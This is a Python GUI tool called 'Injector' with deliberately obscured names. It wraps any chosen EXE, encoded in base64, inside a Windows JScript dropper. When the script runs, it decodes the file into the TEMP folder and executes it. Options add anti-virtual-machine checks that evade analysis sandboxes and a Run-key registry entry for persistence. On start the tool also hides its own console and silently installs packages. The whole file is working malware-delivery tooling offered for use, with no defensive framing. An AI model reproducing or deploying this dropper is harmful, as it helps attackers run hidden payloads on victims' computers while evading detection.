import os,sys,base64,random,string,ctypes,winreg,subprocess
from threading import Thread
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
    ctypes.windll.kernel32.FreeConsole()
except:
    pass

def a1b2c3():
    p=['PyQt5']
    for q in p:
        try:
            __import__(q.replace('-','_'))
        except:
            subprocess.check_call([sys.executable,'-m','pip','install',q,'--quiet'])

try:
    a1b2c3()
except:
    pass

d4e5f6='''
function g7h8i9(){
    try{
        var j0k1l2=WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%COMPUTERNAME%").toLowerCase();
        var m3n4o5=WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%").toLowerCase();
        var p6q7r8=['vbox','vmware','virtual','qemu','xen','hyper-v','docker'];
        for(var s9t0u1=0;s9t0u1<p6q7r8.length;s9t0u1++){
            if(j0k1l2.indexOf(p6q7r8[s9t0u1])!==-1||m3n4o5.indexOf(p6q7r8[s9t0u1])!==-1){return true;}
        }
        try{
            var v2w3x4=GetObject('winmgmts:\\\\\\\\.\\\\root\\\\cimv2');
            var y5z6a7=v2w3x4.ExecQuery('Select * from Win32_Process');
            var b8c9d0=new Enumerator(y5z6a7);
            for(;!b8c9d0.atEnd();b8c9d0.moveNext()){
                var e1f2g3=b8c9d0.item();
                var h4i5j6=e1f2g3.Name.toLowerCase();
                if(h4i5j6.indexOf('vbox')!==-1||h4i5j6.indexOf('vmware')!==-1||h4i5j6.indexOf('vmtoolsd')!==-1||h4i5j6.indexOf('vmsrvc')!==-1||h4i5j6.indexOf('xenserver')!==-1){return true;}
            }
        }catch(e){}
        return false;
    }catch(e){return false;}
}
if(g7h8i9()){WScript.Quit(0);}
'''

k7l8m9='''
var n0o1p2="{0}";
var q3r4s5=new ActiveXObject("Scripting.FileSystemObject");
var t6u7v8=new ActiveXObject("WScript.Shell");
var w9x0y1=null;
{1}
function z2a3b4(c5d6e7){
    var f8g9h0=null,i1j2k3=null;
    try{
        f8g9h0=new ActiveXObject('MSXML2.DOMDocument');
        i1j2k3=f8g9h0.createElement('b64');
        i1j2k3.dataType='bin.base64';
        i1j2k3.text=c5d6e7;
        return i1j2k3.nodeTypedValue;
    }catch(e){return null;}
}
function l4m5n6(){
    try{return t6u7v8.ExpandEnvironmentStrings("%TEMP%");}
    catch(e){return "C:\\\\Windows\\\\Temp";}
}
var o7p8q9=l4m5n6();
var r9s0t1="{1}";
var u2v3w4=q3r4s5.BuildPath(o7p8q9,r9s0t1);
var x5y6z7=null;
x5y6z7=z2a3b4(n0o1p2);
if(x5y6z7!==null){
    try{
        w9x0y1=new ActiveXObject("ADODB.Stream");
        w9x0y1.Type=1;
        w9x0y1.Open();
        w9x0y1.Write(x5y6z7);
        w9x0y1.SaveToFile(u2v3w4,2);
    }catch(e){u2v3w4=null;}
    finally{if(w9x0y1){try{w9x0y1.Close();}catch(ignore){}}}
    if(u2v3w4&&q3r4s5.FileExists(u2v3w4)){
        try{t6u7v8.Run('"'+u2v3w4+'"',1,false);}
        catch(e){if(q3r4s5.FileExists(u2v3w4)){try{q3r4s5.DeleteFile(u2v3w4);}catch(ignore){}}}
    }
}
'''

class a8b9c0:
    def __init__(self):
        self.d1e2f3=""
        self.g4h5i6=[]
    def j7k8l9(self,m0n1o2):
        try:
            with open(m0n1o2,'rb') as p3q4r5:
                return base64.b64encode(p3q4r5.read()).decode('utf-8')
        except:
            return None
    def s5t6u7(self,v8w9x0,y1z2a3,b4c5d6=False):
        e7f8g9=f"tmp_{''.join(random.choices(string.ascii_letters+string.digits,k=8))}.exe"
        h0i1j2=k7l8m9.format(v8w9x0,e7f8g9)
        if b4c5d6:
            h0i1j2=h0i1j2.format(d4e5f6)
        else:
            h0i1j2=h0i1j2.format("")
        return h0i1j2
    def k3l4m5(self,n6o7p8):
        try:
            q9r0s1=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(q9r0s1,"Injector",0,winreg.REG_SZ,n6o7p8)
            winreg.CloseKey(q9r0s1)
            return True
        except:
            return False
    def t1u2v3(self,w4x5y6,z7a8b9,c0d1e2=False,f3g4h5=False):
        i6j7k8=self.j7k8l9(w4x5y6)
        if not i6j7k8:
            return False,"Encoding failed"
        l9m0n1=self.s5t6u7(i6j7k8,c0d1e2)
        try:
            with open(z7a8b9,'w',encoding='utf-8') as o2p3q4:
                o2p3q4.write(l9m0n1)
            if f3g4h5:
                self.k3l4m5(z7a8b9)
            self.g4h5i6.append({'file':os.path.basename(w4x5y6),'output':os.path.basename(z7a8b9),'size':os.path.getsize(w4x5y6),'timestamp':datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
            return True,z7a8b9
        except Exception as r5s6t7:
            return False,str(r5s6t7)

class u7v8w9(QMainWindow):
    def __init__(self):
        super().__init__()
        self.x0y1z2=a8b9c0()
        self.a3b4c5=""
        self.d6e7f8()
    def d6e7f8(self):
        self.setWindowTitle("Injector")
        self.setFixedSize(460,400)
        self.setWindowFlags(Qt.WindowCloseButtonHint)
        self.setStyleSheet("""
            QMainWindow{background-color:#0f0f0f;}
            QLabel{color:#c0c0c0;font-family:'Segoe UI';font-size:13px;}
            QPushButton{background-color:#1c1c1c;color:#e0e0e0;border:1px solid #333333;border-radius:4px;padding:8px 16px;font-family:'Segoe UI';font-weight:bold;font-size:12px;}
            QPushButton:hover{background-color:#2a2a2a;border:1px solid #4a9eff;}
            QPushButton:pressed{background-color:#141414;}
            QPushButton#browse_btn{background-color:#222222;border:1px solid #3a3a3a;padding:8px 14px;font-size:12px;}
            QPushButton#browse_btn:hover{background-color:#2e2e2e;border:1px solid #4a9eff;}
            QPushButton#inject_btn{background-color:#1a6a9a;border:none;font-size:16px;padding:14px;font-weight:bold;border-radius:4px;color:#ffffff;}
            QPushButton#inject_btn:hover{background-color:#2a8acc;}
            QPushButton#inject_btn:disabled{background-color:#333333;color:#666666;}
            QLineEdit{background-color:#141414;color:#d0d0d0;border:1px solid #2a2a2a;border-radius:4px;padding:10px;font-family:'Segoe UI';font-size:12px;}
            QLineEdit:disabled{color:#555555;}
            QCheckBox{color:#c0c0c0;font-family:'Segoe UI';font-size:13px;spacing:10px;}
            QCheckBox::indicator{width:18px;height:18px;background-color:#141414;border:2px solid #333333;border-radius:3px;}
            QCheckBox::indicator:checked{background-color:#1a6a9a;border:2px solid #1a6a9a;}
            QCheckBox::indicator:hover{border:2px solid #4a9eff;}
            QStatusBar{background-color:#0f0f0f;color:#555555;font-family:'Segoe UI';font-size:10px;}
        """)
        g9h0i1=QWidget()
        self.setCentralWidget(g9h0i1)
        j1k2l3=QVBoxLayout(g9h0i1)
        j1k2l3.setSpacing(8)
        j1k2l3.setContentsMargins(20,18,20,18)
        m4n5o6=QLabel("Injector")
        m4n5o6.setAlignment(Qt.AlignCenter)
        m4n5o6.setStyleSheet("font-size:22px;font-weight:bold;color:#4a9eff;padding:4px;font-family:'Segoe UI';")
        j1k2l3.addWidget(m4n5o6)
        p7q8r9=QLabel("EXE File:")
        p7q8r9.setStyleSheet("color:#888888;font-size:12px;padding-top:4px;")
        j1k2l3.addWidget(p7q8r9)
        v3w4x5=QHBoxLayout()
        v3w4x5.setSpacing(8)
        self.y6z7a8=QLineEdit()
        self.y6z7a8.setPlaceholderText("Select EXE file...")
        self.y6z7a8.setReadOnly(True)
        self.y6z7a8.setMinimumHeight(34)
        v3w4x5.addWidget(self.y6z7a8,stretch=5)
        b9c0d1=QPushButton("Browse")
        b9c0d1.setObjectName("browse_btn")
        b9c0d1.clicked.connect(self.e1f2g3)
        b9c0d1.setFixedWidth(80)
        b9c0d1.setMinimumHeight(34)
        v3w4x5.addWidget(b9c0d1)
        j1k2l3.addLayout(v3w4x5)
        self.h4i5j6=QLabel("No file selected")
        self.h4i5j6.setStyleSheet("color:#555555;font-size:11px;padding-left:4px;padding-bottom:4px;")
        j1k2l3.addWidget(self.h4i5j6)
        n0o1p2=QHBoxLayout()
        n0o1p2.setSpacing(16)
        self.q3r4s5=QCheckBox("Add Startup")
        self.q3r4s5.setMinimumHeight(28)
        self.t6u7v8=QCheckBox("Anti-VM")
        self.t6u7v8.setMinimumHeight(28)
        self.t6u7v8.setChecked(True)
        n0o1p2.addWidget(self.q3r4s5)
        n0o1p2.addWidget(self.t6u7v8)
        n0o1p2.addStretch()
        j1k2l3.addLayout(n0o1p2)
        self.w9x0y1=QPushButton("INJECT")
        self.w9x0y1.setObjectName("inject_btn")
        self.w9x0y1.clicked.connect(self.z1a2b3)
        self.w9x0y1.setMinimumHeight(46)
        j1k2l3.addWidget(self.w9x0y1)
        j1k2l3.addStretch()
        self.statusBar=QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage("Ready")
    def e1f2g3(self):
        c4d5e6,_=QFileDialog.getOpenFileName(self,"Select EXE File","","Executable Files (*.exe);;All Files (*.*)")
        if c4d5e6:
            self.a3b4c5=c4d5e6
            self.y6z7a8.setText(c4d5e6)
            f6g7h8=os.path.getsize(c4d5e6)
            i9j0k1=f"{f6g7h8/1024/1024:.2f} MB" if f6g7h8>1024*1024 else f"{f6g7h8/1024:.2f} KB"
            self.h4i5j6.setText(f"{os.path.basename(c4d5e6)} ({i9j0k1})")
            self.h4i5j6.setStyleSheet("color:#4a9eff;font-size:11px;padding-left:4px;padding-bottom:4px;")
            self.statusBar.showMessage(f"Loaded: {os.path.basename(c4d5e6)}")
    def z1a2b3(self):
        if not self.a3b4c5:
            QMessageBox.warning(self,"No File","Select an EXE file first.",QMessageBox.Ok)
            return
        l2m3n4,_=QFileDialog.getSaveFileName(self,"Save JS File","","JavaScript Files (*.js);;All Files (*.*)")
        if not l2m3n4:
            return
        self.w9x0y1.setEnabled(False)
        self.w9x0y1.setText("...")
        self.statusBar.showMessage("Processing...")
        def o5p6q7():
            try:
                r8s9t0,u1v2w3=self.x0y1z2.t1u2v3(self.a3b4c5,l2m3n4,self.t6u7v8.isChecked(),self.q3r4s5.isChecked())
                if r8s9t0:
                    x4y5z6=os.path.getsize(l2m3n4)
                    self.statusBar.showMessage(f"Done: {os.path.basename(l2m3n4)} ({x4y5z6/1024:.1f} KB)")
                    QMessageBox.information(self,"Done",f"Injection successful!\\n\\nOutput: {os.path.basename(l2m3n4)}\\nSize: {x4y5z6/1024:.1f} KB",QMessageBox.Ok)
                else:
                    self.statusBar.showMessage("Failed")
                    QMessageBox.critical(self,"Error",f"Failed:\\n{u1v2w3}",QMessageBox.Ok)
            except Exception as a6b7c8:
                self.statusBar.showMessage("Error")
                QMessageBox.critical(self,"Error",str(a6b7c8),QMessageBox.Ok)
            finally:
                self.w9x0y1.setEnabled(True)
                self.w9x0y1.setText("INJECT")
        QThreadPool.globalInstance().start(lambda: o5p6q7())

if __name__=="__main__":
    d8e9f0=QApplication(sys.argv)
    d8e9f0.setStyle('Fusion')
    g1h2i3=QIcon()
    g1h2i3.addPixmap(QPixmap(1,1))
    d8e9f0.setWindowIcon(g1h2i3)
    j4k5l6=u7v8w9()
    m7n8o9=d8e9f0.primaryScreen().geometry()
    j4k5l6.move((m7n8o9.width()-j4k5l6.width())//2,(m7n8o9.height()-j4k5l6.height())//2)
    j4k5l6.show()
    sys.exit(d8e9f0.exec_())